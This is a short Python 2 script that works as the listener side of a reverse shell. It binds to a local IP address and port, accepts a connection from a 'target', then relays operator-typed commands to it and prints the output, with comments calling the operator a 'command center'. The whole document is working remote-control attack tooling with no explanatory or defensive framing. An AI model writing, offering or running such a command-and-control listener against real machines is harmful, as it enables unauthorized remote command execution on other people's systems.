
#!/usr/bin/python

import socket
from termcolor import colored


def shell():
	while True:
		# getting command from command center, if q, quit the program, else continue...
		command = raw_input("* Shell#~%s: " %str(ip))
		target.send(command)
		if command == 'q':
			break
		else:
			message_target = target.recv(1024)
			print(message_target)

def server():
	global s
	global ip
	global target


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind(("192.168.1.148",56789))
	s.listen(5)

	print(colored("[-*-] Listening for the connection.....", 'green'))

	target, ip = s.accept()

	print(colored("[+*+] Connection established from: %s" % str(ip), 'green'))

server()
shell()
s.close()


